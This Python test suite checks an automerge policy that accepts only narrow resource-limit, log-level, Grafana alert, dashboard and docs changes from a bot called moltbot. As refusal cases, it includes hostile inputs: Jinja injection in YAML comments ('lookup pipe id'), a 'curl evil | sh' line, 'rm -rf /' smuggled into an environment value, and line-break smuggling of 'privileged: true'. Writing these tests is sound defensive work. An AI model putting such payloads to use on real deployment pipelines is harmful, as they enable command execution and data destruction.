"""Tests for the bot-config class (docs/AUTOMERGE.md, "Bot-config class"):
moltbot's own low-risk config MRs, checked by path AND shape.

Run: python3 -m unittest discover -s ci/automerge -v
"""

import copy
import json
import re
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import automerge  # noqa: E402
import botconfig  # noqa: E402
import policy  # noqa: E402
from policy import FileChange  # noqa: E402

try:
    import yaml
except ImportError:  # pragma: no cover
    yaml = None

REPO = Path(__file__).resolve().parents[2]
RENOVATE = "project_4_bot_af78a2ea227eba9e10006515fbde375e"
C = policy.COMPOSE_PATH
ALERTS = "docker/grafana/provisioning/alerting/infrastructure.yml"
DASH = "docker/grafana/provisioning/dashboards/json/ups.json"
D1 = "sha256:" + "1" * 64

COMPOSE = f"""services:
  mopidy:
    container_name: mopidy
    image: mopidy/mopidy:3.4.2@{D1}
    networks:
      iot:
        ipv4_address: {{{{ mopidy_address }}}}
    deploy:
      resources:
        limits:
          memory: 128M
    environment:
      - TZ=America/New_York
    restart: unless-stopped
  plex:
    image: plexinc/pms-docker:1.43.4.10903-e5521bd8c@{D1}
    deploy:
      resources:
        limits:
          memory: 8G
        reservations:
          memory: 3G
    command:
      - /bin/sh
      - -c
      - |
        # tune
        echo memory: 1G
  navidrome:
    image: deluan/navidrome:0.64.2@{D1}
    environment:
      - ND_LOGLEVEL=info
      - ND_SCANSCHEDULE=1h
    deploy:
      resources:
        limits:
          cpus: '2'
  vault:
    image: hashicorp/vault:2.2.1@{D1}
    deploy:
      resources:
        limits:
          memory: 512M
  openclaw-gateway:
    image: "{{{{ openclaw_image }}}}"
    deploy:
      resources:
        limits:
          memory: 4G
"""

ALERT_FILE = """apiVersion: 1
groups:
  - orgId: 1
    name: container-alerts
    folder: General Alerting
    interval: 1m
    rules:
      - uid: container-memory-near-limit
        title: Container Memory Near Limit
        condition: C
        data:
          - refId: A
            datasourceUid: influxdb
            model:
              query: 'from(bucket: "metrics")'
              refId: A
          - refId: C
            datasourceUid: __expr__
            model: {type: threshold, expression: B, refId: C, conditions: [{evaluator: {type: gt, params: [85]}}]}
        noDataState: OK
        for: 5m
        annotations:
          summary: "Memory near limit"
        labels:
          severity: warning
"""

DASH_FILE = json.dumps({"uid": "ups", "title": "UPS", "panels": [
    {"id": 1, "title": "Load", "datasource": {"type": "influxdb", "uid": "influxdb"}}]}, indent=2)

ALLOW = {
    "authors": ["moltbot", RENOVATE],
    "target_branch": "main",
    "compose_files": [C],
    "denylist": {"services": {"vault": "deploys need it"}, "images": {"hashicorp/vault": "Vault"}},
    "bot_config": {
        "enabled": True, "authors": ["moltbot"], "max_per_24h": 6, "resource_ratio": [0.5, 2.0],
        "paths": {"compose": [C], "alerts": [ALERTS],
                  "dashboard": ["docker/grafana/provisioning/dashboards/json/*.json"],
                  "docs": ["docs/*.md", "README.md"]},
        "docs_exclude": ["docs/AUTOMERGE.md", "docs/jit-*"],
        "denied_services": ["nginx"],
    },
}
CODEOWNERS = "/docker/ @root\n/docker/docker-compose.yml @root @bot\n/ci/ @root\n"
ROUTER = policy.Deployment("router.lab.nkontur.com", "router", "docker", "10.4.0.1")


def edit(text, old, new, count=1):
    assert old in text, old
    return text.replace(old, new, count)


def evaluate(changes, *, author="moltbot", labels=(), allow=ALLOW, extra_files=()):
    """changes: {path: (base, head)}."""
    files = [FileChange(path=p) for p in changes] + list(extra_files)
    return policy.evaluate_mr(author=author, target_branch="main", labels=list(labels), files=files,
                              composes=dict(changes), deployments={C: [ROUTER]}, allowlist=allow,
                              codeowners_text=CODEOWNERS, merger="automerge-bot")


MR_993 = edit(COMPOSE, "        limits:\n          memory: 128M",
              "        limits:\n          memory: 192M")
MR_993 = edit(MR_993, "    deploy:\n      resources:\n        limits:\n          memory: 192M",
              "    # Anon peaked at 117 MiB in 10d (2026-11-05), 92% of the old 128M.\n"
              "    # 192M is ~1.6x the peak. Measure anon, not usage.\n"
              "    deploy:\n      resources:\n        limits:\n          memory: 192M")


class ComposeTests(unittest.TestCase):
    def test_mr_993_mopidy_memory_with_comments(self):
        v = evaluate({C: (COMPOSE, MR_993)})
        self.assertTrue(v.eligible, v.reasons)
        self.assertTrue(v.bot_config)
        self.assertEqual(v.deploy_jobs, ["router"])
        self.assertEqual(v.config_services, [(C, "mopidy")])
        self.assertEqual(v.hold_keys, [("router", "mopidy")])
        self.assertIn("deploy.resources.limits.memory 128M -> 192M", " ".join(v.notes))

    def test_bounds(self):
        for new, ok in (("256M", True), ("257M", False), ("64M", True), ("63M", False), ("0.25G", True),
                        ("1G", False), ("512M", False)):
            with self.subTest(new=new):
                v = evaluate({C: (COMPOSE, edit(COMPOSE, "memory: 128M", f"memory: {new}"))})
                self.assertEqual(v.eligible, ok, v.reasons)
        v = evaluate({C: (COMPOSE, edit(COMPOSE, "cpus: '2'", "cpus: '4'"))})
        self.assertTrue(v.eligible, v.reasons)
        v = evaluate({C: (COMPOSE, edit(COMPOSE, "cpus: '2'", "cpus: '5'"))})
        self.assertFalse(v.eligible)
        self.assertIn("2.50x", " ".join(v.reasons))
        v = evaluate({C: (COMPOSE, edit(COMPOSE, "memory: 3G", "memory: 4G"))})   # reservation
        self.assertTrue(v.eligible, v.reasons)

    def test_mr_994_adding_a_limit_is_refused(self):
        head = edit(COMPOSE, "        limits:\n          memory: 8G", "        limits:\n          cpus: '16'\n          memory: 8G")
        v = evaluate({C: (COMPOSE, head)})
        self.assertFalse(v.eligible)
        self.assertIn("added or removed", " ".join(v.reasons))

    def test_extra_line_in_hunk_refused(self):
        head = edit(edit(COMPOSE, "memory: 128M", "memory: 192M"), "restart: unless-stopped", "restart: always")
        v = evaluate({C: (COMPOSE, head)})
        self.assertFalse(v.eligible)
        self.assertIn("only resource limit and log-level values may change", " ".join(v.reasons))
        head = edit(COMPOSE, "      - TZ=America/New_York", "      - TZ=UTC")
        self.assertFalse(evaluate({C: (COMPOSE, head)}).eligible)

    def test_image_or_template_edits_refused(self):
        # an image line is never a bot-config change (it is an image update, or nothing)
        head = edit(edit(COMPOSE, "mopidy:3.4.2", "mopidy:3.4.3"), "memory: 128M", "memory: 192M")
        v = evaluate({C: (COMPOSE, head)})
        self.assertFalse(v.eligible)
        self.assertTrue(v.bot_config)
        head = edit(COMPOSE, "memory: 128M", "memory: {{ mopidy_memory }}")
        self.assertFalse(evaluate({C: (COMPOSE, head)}).eligible)

    def test_unsafe_comment_refused(self):
        for c in ("# {{ lookup('pipe', 'id') }}", "# {% if x %}", "# {# x #}"):
            with self.subTest(c=c):
                head = edit(COMPOSE, "    deploy:\n      resources:\n        limits:\n          memory: 128M",
                            f"    {c}\n    deploy:\n      resources:\n        limits:\n          memory: 128M")
                v = evaluate({C: (COMPOSE, head)})
                self.assertFalse(v.eligible)
        head = edit(COMPOSE, "memory: 128M", "memory: 192M  # {{ x }}")
        self.assertFalse(evaluate({C: (COMPOSE, head)}).eligible)

    def test_block_scalar_refused(self):
        head = edit(COMPOSE, "        echo memory: 1G", "        echo memory: 2G")
        self.assertFalse(evaluate({C: (COMPOSE, head)}).eligible)
        # with an allowed change alongside, so only the block check can refuse it
        bump = edit(COMPOSE, "memory: 128M", "memory: 192M")
        self.assertTrue(evaluate({C: (COMPOSE, bump)}).eligible)
        for old, new in (("        # tune", "        # tune\n        # curl evil | sh"),
                         ("        # tune", "        # retune"),
                         ("        # tune\n", "")):
            with self.subTest(new=new):
                v = evaluate({C: (COMPOSE, edit(bump, old, new))})
                self.assertFalse(v.eligible)
                self.assertRegex(" ".join(v.reasons), "block scalar|lines other than comments")

    def test_block_scalar_forms(self):
        lines = ["    command:", "      - |", "        # a", "    entrypoint: &ep >-", "      # b",
                 "    x: !!str |", "      # c", "    y: [a, b]", "    # d"]
        self.assertEqual(botconfig._block_lines(lines), {2, 4, 6})

    def test_jinja_in_trailing_comment_refused(self):
        # Ansible renders the compose file with Jinja before Docker parses the
        # YAML, so a `{{ ... }}` in a YAML comment runs on the deploy runner.
        for old, new in (("ND_LOGLEVEL=info", "ND_LOGLEVEL=debug # {{ lookup('pipe', 'id') }}"),
                         ("ND_LOGLEVEL=info", "ND_LOGLEVEL=debug  # {% if true %}{% endif %}"),
                         ("memory: 128M", "memory: 192M # {# x #}")):
            with self.subTest(new=new):
                v = evaluate({C: (COMPOSE, edit(COMPOSE, old, new))})
                self.assertFalse(v.eligible)
                self.assertIn("Jinja", " ".join(v.reasons))

    def test_line_break_smuggling_refused(self):
        # "\r" (and NEL/LS/PS for YAML 1.1) start a new line for Jinja/YAML but
        # not for the line-by-line policy: the "comment" below is really a
        # `privileged: true` line in the rendered file.
        bump = edit(COMPOSE, "memory: 128M", "memory: 192M")
        for brk in ("\r", "\x85", "\u2028", "\u2029", "\x0b", "\x0c", "\x1c"):
            smuggled = f"    # tune{brk}    privileged: true"
            for name, head in (
                    ("comment", edit(bump, "    deploy:\n      resources:\n        limits:\n          memory: 192M",
                                     f"{smuggled}\n    deploy:\n      resources:\n        limits:\n"
                                     "          memory: 192M")),
                    ("resource comment", edit(COMPOSE, "memory: 128M", f"memory: 192M #{smuggled}")),
                    ("log level comment", edit(COMPOSE, "ND_LOGLEVEL=info", f"ND_LOGLEVEL=debug #{smuggled}"))):
                with self.subTest(brk=repr(brk), where=name):
                    v = evaluate({C: (COMPOSE, head)})
                    self.assertFalse(v.eligible)
                    self.assertIn("line break", " ".join(v.reasons))

    def test_unbalanced_quotes_refused(self):
        # found by test_properties: `'192M` / `'info` passed as 192M / info,
        # and an unterminated quote makes the compose file invalid YAML
        for old, new in (("memory: 128M", "memory: '192M"), ("memory: 128M", 'memory: 192M"')):
            with self.subTest(new=new):
                self.assertFalse(evaluate({C: (COMPOSE, edit(COMPOSE, old, new))}).eligible)
        for old, new in (("memory: 128M", "memory: '192M'"), ("memory: 128M", 'memory: "192M"'),
                         ("ND_LOGLEVEL=info", "ND_LOGLEVEL=debug")):
            with self.subTest(new=new):
                v = evaluate({C: (COMPOSE, edit(COMPOSE, old, new))})
                self.assertTrue(v.eligible, v.reasons)

    def test_denied_services(self):
        for old, new in (("memory: 512M", "memory: 600M"), ("memory: 4G", "memory: 6G")):
            with self.subTest(new=new):
                v = evaluate({C: (COMPOSE, edit(COMPOSE, old, new))})
                self.assertFalse(v.eligible)
                self.assertIn("denied to the bot-config class", " ".join(v.reasons))

    def test_log_level(self):
        v = evaluate({C: (COMPOSE, edit(COMPOSE, "ND_LOGLEVEL=info", "ND_LOGLEVEL=debug"))})
        self.assertTrue(v.eligible, v.reasons)
        self.assertEqual(v.config_services, [(C, "navidrome")])
        for bad in ("ND_LOGLEVEL=info; rm -rf /", "ND_LOGLEVEL=chatty", "ND_SCANSCHEDULE=2h",
                    "ND_LOGLEVEL='debug", 'ND_LOGLEVEL=debug"', "ND_LOGLEVEL='\"debug\"'"):
            with self.subTest(bad=bad):
                old = "ND_SCANSCHEDULE=1h" if bad.startswith("ND_SCAN") else "ND_LOGLEVEL=info"
                self.assertFalse(evaluate({C: (COMPOSE, edit(COMPOSE, old, bad))}).eligible)


class GrafanaTests(unittest.TestCase):
    def test_alert_threshold_for_and_text(self):
        head = edit(edit(edit(ALERT_FILE, "params: [85]", "params: [90]"), "for: 5m", "for: 10m"),
                    'summary: "Memory near limit"', 'summary: "Memory above 90% of the limit"')
        head = edit(head, "severity: warning", "severity: critical")
        v = evaluate({ALERTS: (ALERT_FILE, head)})
        self.assertTrue(v.eligible, v.reasons)
        self.assertEqual(v.grafana_files, [ALERTS])
        self.assertEqual(v.deploy_jobs, ["router"])
        self.assertIn(("router", policy.GRAFANA_HOLD), v.hold_keys)

    def test_alert_other_edits_refused(self):
        for old, new in (("""query: 'from(bucket: "metrics")'""", """query: 'from(bucket: "other")'"""),
                         ("datasourceUid: influxdb", "datasourceUid: loki"),
                         ("severity: warning", "severity: page"),
                         ("noDataState: OK", "noDataState: Alerting"),
                         ("title: Container Memory Near Limit", "title: x"),
                         ("interval: 1m", "interval: 5m"),
                         ("type: gt", "type: lt"),
                         ("for: 5m", "for: soon"),
                         ("        labels:\n          severity: warning",
                          "        labels:\n          severity: warning\n          notify: agent")):
            with self.subTest(new=new):
                v = evaluate({ALERTS: (ALERT_FILE, edit(ALERT_FILE, old, new))})
                self.assertFalse(v.eligible)

    def test_rule_added_refused(self):
        rule = ALERT_FILE.split("    rules:\n", 1)[1]
        head = ALERT_FILE + rule.replace("container-memory-near-limit", "new-rule")
        self.assertFalse(evaluate({ALERTS: (ALERT_FILE, head)}).eligible)

    def test_dashboard(self):
        d = json.loads(DASH_FILE)
        d["panels"][0]["title"] = "UPS load (%)"
        d["panels"].append({"id": 2, "title": "Runtime", "datasource": {"type": "influxdb", "uid": "influxdb"}})
        v = evaluate({DASH: (DASH_FILE, json.dumps(d))})
        self.assertTrue(v.eligible, v.reasons)
        d["panels"][1]["datasource"]["uid"] = "loki"
        v = evaluate({DASH: (DASH_FILE, json.dumps(d))})
        self.assertFalse(v.eligible)
        self.assertIn("datasources the dashboard did not use", " ".join(v.reasons))
        d = json.loads(DASH_FILE)
        d["uid"] = "other"
        self.assertFalse(evaluate({DASH: (DASH_FILE, json.dumps(d))}).eligible)
        self.assertFalse(evaluate({DASH: (DASH_FILE, "{not json")}).eligible)


class PathTests(unittest.TestCase):
    def test_docs(self):
        v = evaluate({"docs/OBSERVABILITY.md": ("a\n", "b\n")})
        self.assertTrue(v.eligible, v.reasons)
        self.assertEqual(v.deploy_jobs, [])
        self.assertTrue(evaluate({"README.md": ("a", "b")}).eligible)
        for p in ("docs/AUTOMERGE.md", "docs/jit-access-design.md", "CLAUDE.md", "docs/x.sh"):
            with self.subTest(p=p):
                self.assertFalse(evaluate({p: ("a", "b")}).eligible)

    def test_never_list(self):
        for p in ("networking/iptables/rules.v4", "ansible/inventory.yml", ".gitlab-ci.yml",
                  "ci/automerge/policy.py", "ci/automerge-policy.yml", "renovate.json", "CODEOWNERS",
                  "docker/openclaw/config.json", "docker/openclaw-workspace/x.md", "docker/vault/config.hcl",
                  "terraform/vault/policies.tf", "scripts/approve-root-mr.sh", "docker/grafana/x.env",
                  "docker/grafana/provisioning/alerting/contactpoints.yml.j2",
                  "docker/grafana/provisioning/alerting/policies.yml",
                  "docker/grafana/provisioning/datasources/loki.yml", "docker/promtail/config.yml",
                  "base/systemd/x.service", "docs/openclaw.md"):
            with self.subTest(p=p):
                r = botconfig.evaluate_files([FileChange(path=p)], {p: ("a", "b")}, ALLOW)
                self.assertTrue(r.reasons)
                v = evaluate({p: ("a", "b")})
                self.assertFalse(v.eligible)

    def test_never_list_wins_over_policy_allowlist(self):
        allow = copy.deepcopy(ALLOW)
        allow["bot_config"]["paths"]["docs"].append("ci/**")
        allow["bot_config"]["paths"]["docs"].append("docker/openclaw/**")
        for p in ("ci/automerge/policy.py", "docker/openclaw/AGENTS.md"):
            self.assertFalse(evaluate({p: ("a", "b")}, allow=allow).eligible)

    def test_file_operations_refused(self):
        for fc in (FileChange(path="docs/new.md", new_file=True), FileChange(path="docs/OBSERVABILITY.md", deleted_file=True),
                   FileChange(path="docs/b.md", old_path="docs/a.md", renamed_file=True),
                   FileChange(path="docs/OBSERVABILITY.md", mode_changed=True)):
            with self.subTest(fc=fc):
                v = policy.evaluate_mr(author="moltbot", target_branch="main", labels=[], files=[fc],
                                       composes={fc.path: ("a", "b")}, deployments={C: [ROUTER]},
                                       allowlist=ALLOW, codeowners_text=CODEOWNERS, merger="automerge-bot")
                self.assertFalse(v.eligible)

    def test_script_content_refused(self):
        self.assertFalse(evaluate({"docs/run.md": ("a", "#!/bin/sh\nid\n")}).eligible)

    def test_mixed_allowed_and_denied_refused(self):
        v = evaluate({C: (COMPOSE, MR_993), "ansible/inventory.yml": ("a", "b")})
        self.assertFalse(v.eligible)

    def test_mr_977_never_qualifies(self):
        # telegraf script (new file), inventory entry, new alert rule
        rule = ALERT_FILE.split("    rules:\n", 1)[1]
        v = evaluate({"ansible/inventory.yml": ("a", "b"),
                      ALERTS: (ALERT_FILE, ALERT_FILE + rule.replace("container-memory-near-limit", "smart-disk-vanished"))},
                     extra_files=[FileChange(path="docker/telegraf/scripts/zpool-health.sh", new_file=True)])
        self.assertFalse(v.eligible)
        text = " ".join(v.reasons)
        self.assertIn("never-list", text)
        self.assertIn("added", text)


class GateTests(unittest.TestCase):
    def test_authors_and_labels(self):
        self.assertFalse(evaluate({C: (COMPOSE, MR_993)}, author=RENOVATE).eligible)
        self.assertFalse(evaluate({C: (COMPOSE, MR_993)}, author="someone").eligible)
        for label in ("freeze", "security", "major"):
            with self.subTest(label=label):
                self.assertFalse(evaluate({C: (COMPOSE, MR_993)}, labels=[label]).eligible)
        v = evaluate({C: (COMPOSE, MR_993)}, labels=["freeze"])
        self.assertTrue(v.frozen)
        self.assertFalse(v.manual)

    def test_disabled_or_malformed(self):
        allow = copy.deepcopy(ALLOW)
        allow["bot_config"]["enabled"] = False
        self.assertFalse(evaluate({C: (COMPOSE, MR_993)}, allow=allow).eligible)
        for bad in ({"resource_ratio": [0.1, 10]}, {"paths": {"scripts": ["x"]}}, {"max_per_24h": "6"},
                    {"paths": {"compose": ["docs/x.md"]}}):
            with self.subTest(bad=bad):
                allow = copy.deepcopy(ALLOW)
                allow["bot_config"].update(bad)
                self.assertFalse(evaluate({C: (COMPOSE, MR_993)}, allow=allow).eligible)

    def test_moltbot_image_update_stays_general(self):
        head = edit(COMPOSE, f"mopidy:3.4.2@{D1}", "mopidy:3.4.3@sha256:" + "2" * 64)
        v = evaluate({C: (COMPOSE, head)})
        self.assertTrue(v.eligible, v.reasons)
        self.assertFalse(v.bot_config)

    def test_rate_gate(self):
        bot = {"labels": ["automerged", automerge.LABEL_BOT_CONFIG]}
        self.assertIsNone(automerge.bot_config_rate_gate([bot] * 5, ALLOW))
        self.assertIn("bot-config", automerge.bot_config_rate_gate([bot] * 6, ALLOW))
        # and they count against the general budget
        self.assertIsNotNone(automerge.rate_gate([bot] * 3, {**ALLOW, "max_per_24h": 3}, fast_track=False))

    def test_report_lines(self):
        merged = [{"title": "resources: raise mopidy memory limit to 192M", "web_url": "u",
                   "labels": ["automerged", automerge.LABEL_BOT_CONFIG]},
                  {"title": "chore(deps): x", "web_url": "v", "labels": ["automerged"]}]
        lines = automerge.report_bot_config(merged)
        self.assertIn("  merged for moltbot: resources: raise mopidy memory limit to 192M  u", lines)
        self.assertEqual(len(lines), 2)

    def test_merge_message(self):
        class GL:
            dry_run = False
            writes = []

            def write(self, m, p, b=None):
                self.writes.append((m, p, b))
                return {}
        gl = GL()
        mr = {"iid": 993, "sha": "a" * 40, "source_branch": "resources/mopidy-memory", "target_branch": "main",
              "title": "resources: raise mopidy memory limit to 192M", "detailed_merge_status": "not_approved"}
        self.assertTrue(automerge.do_merge(gl, mr, evaluate({C: (COMPOSE, MR_993)})))
        msg = next(b for m, p, b in gl.writes if p.endswith("/merge"))["merge_commit_message"]
        self.assertIn("Automerge-Class: bot-config", msg)
        self.assertIn("Automerge-Deploy: [router]", msg)
        self.assertIn("Automerge-Policy: bot-config", msg)
        self.assertNotIn("image-update", msg)
        gl.writes.clear()
        automerge.do_merge(gl, mr, evaluate({"docs/OBSERVABILITY.md": ("a", "b")}))
        msg = next(b for m, p, b in gl.writes if p.endswith("/merge"))["merge_commit_message"]
        self.assertNotIn("Automerge-Deploy", msg)
        self.assertIn("Automerge-Policy: bot-config", msg)

    def test_hold(self):
        v = evaluate({C: (COMPOSE, MR_993)})
        self.assertIn("#5", automerge.rollback_gate([({"iid": 5}, {("router", "mopidy")})], v))
        self.assertIsNone(automerge.rollback_gate([({"iid": 5}, {("router", "plex")})], v))
        plan = {"services": [{"service": "mopidy"}], "grafana_files": [{"src": ALERTS}]}
        self.assertEqual(automerge.plan_hold_services(plan), ["mopidy", policy.GRAFANA_HOLD])


@unittest.skipIf(yaml is None, "PyYAML not installed")
class RealRepoTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.allow = yaml.safe_load((REPO / "ci" / "automerge-policy.yml").read_text())
        cls.allow["services"] = {k: (v or {}) for k, v in (cls.allow.get("services") or {}).items()}
        cls.cfg = botconfig.config(cls.allow)
        cls.deps = policy.compose_deployments(yaml.safe_load((REPO / "ansible" / "inventory.yml").read_text()),
                                              cls.allow)
        cls.codeowners = (REPO / "CODEOWNERS").read_text()

    def owners(self, path):
        found = None
        for pat, own in policy.parse_codeowners(self.codeowners):
            if policy.codeowners_match(pat, path):
                found = own
        return found

    def eval_real(self, path, head):
        base = (REPO / path).read_text()
        return policy.evaluate_mr(author="moltbot", target_branch="main", labels=[], files=[FileChange(path=path)],
                                  composes={path: (base, head)}, deployments=self.deps, allowlist=self.allow,
                                  codeowners_text=self.codeowners, merger="automerge-bot")

    def test_config(self):
        self.assertTrue(self.cfg["enabled"])
        self.assertEqual(self.cfg["authors"], ["moltbot"])
        self.assertEqual(self.cfg["max_per_24h"], 6)
        self.assertEqual(self.cfg["paths"]["compose"], policy.compose_files(self.allow))

    def test_mopidy_on_the_real_file(self):
        text = (REPO / C).read_text()
        m = re.search(r"(  mopidy:\n(?:    .*\n|\n)*?          memory: )(\d+)M", text)
        self.assertTrue(m)
        old = int(m.group(2))
        head = text[:m.start(2)] + str(int(old * 1.5)) + text[m.end(2):]
        v = self.eval_real(C, head)
        self.assertTrue(v.eligible, v.reasons)
        self.assertEqual(v.deploy_jobs, ["router"])
        head = text[:m.start(2)] + str(old * 3) + text[m.end(2):]
        self.assertFalse(self.eval_real(C, head).eligible)

    def test_real_alert_file(self):
        text = (REPO / ALERTS).read_text()
        v = self.eval_real(ALERTS, text.replace("for: 10m", "for: 15m", 1))
        self.assertTrue(v.eligible, v.reasons)
        v = self.eval_real(ALERTS, text.replace("bucket: \"metrics\"", "bucket: \"other\"", 1))
        self.assertFalse(v.eligible)

    def test_real_dashboards_parse(self):
        for p in sorted((REPO / "docker/grafana/provisioning/dashboards/json").glob("*.json")):
            rel = str(p.relative_to(REPO))
            self.assertEqual(botconfig.classify(rel, self.cfg)[0], "dashboard")
            d = json.loads(p.read_text())
            d["title"] = d["title"] + " (x)"
            self.assertTrue(self.eval_real(rel, json.dumps(d, indent=2)).eligible)

    def test_code_owned_paths_list_the_bot(self):
        # the sweep's approval counts only where the bot is a code owner
        for kind in ("compose", "alerts"):
            for path in self.cfg["paths"][kind]:
                own = self.owners(path)
                self.assertIn("@project_4_bot_9927c1d39b8f3ba11b15bfa664d8b6d6", own or [], path)
        for p in (REPO / "docker/grafana/provisioning/dashboards/json").glob("*.json"):
            self.assertIn("@project_4_bot_9927c1d39b8f3ba11b15bfa664d8b6d6",
                          self.owners(str(p.relative_to(REPO))) or [])
        for p in ("docker/grafana/provisioning/alerting/policies.yml",
                  "docker/grafana/provisioning/alerting/contactpoints.yml.j2",
                  "docker/grafana/provisioning/datasources/loki.yml"):
            self.assertEqual(self.owners(p), ["@root"], p)

    def test_docs_exclusions(self):
        for p in ("docs/AUTOMERGE.md", "docs/DISASTER_RECOVERY.md", "docs/FIREWALL.md", "docs/DEPLOY.md",
                  "docs/jit-access-design.md", "docs/SECRET_ROTATION.md", "CLAUDE.md"):
            self.assertIsNone(botconfig.classify(p, self.cfg)[0], p)
        self.assertEqual(botconfig.classify("docs/OBSERVABILITY.md", self.cfg)[0], "docs")

    def test_global_denylist_services_denied(self):
        text = (REPO / C).read_text()
        for svc in policy.denylist(self.allow)["services"]:
            m = re.search(rf"\n  {re.escape(svc)}:\n(?:    .*\n|\n)*?          memory: (\d+)([MG])\n", text)
            if not m:
                continue
            head = text[:m.start(1)] + str(int(m.group(1)) + 1) + text[m.end(1):]
            self.assertFalse(self.eval_real(C, head).eligible, svc)

    def test_ci_rule_and_playbook(self):
        ci = (REPO / ".gitlab-ci.yml").read_text()
        m = re.search(r"\.automerged_commit_manual:\n  rules:\n    - if: '.*?=~ /(Automerge-Policy: [^/]*)/'", ci)
        self.assertTrue(re.search(m.group(1), automerge.BOT_TRAILER))
        play = yaml.safe_load((REPO / "ansible" / "service-update.yml").read_text())[0]
        block = next(t for t in play["tasks"] if "block" in t)
        names = [t.get("name") for t in block["block"]]
        up = block["block"][names.index("Pull and recreate only the target services")]
        self.assertEqual(up["when"], "automerge_services | length > 0")   # never "all services"
        self.assertIn("Grafana - reload provisioning and check it took effect", names)
        rnames = [t.get("name") for t in block["rescue"]]
        self.assertLess(rnames.index("ROLLBACK - Grafana - reload previous provisioning"),
                        rnames.index("ROLLBACK - outcome"))
        rb = block["rescue"][rnames.index("ROLLBACK - recreate target services on their previous image")]
        self.assertEqual(rb["when"], "automerge_services | length > 0")


if __name__ == "__main__":
    unittest.main()
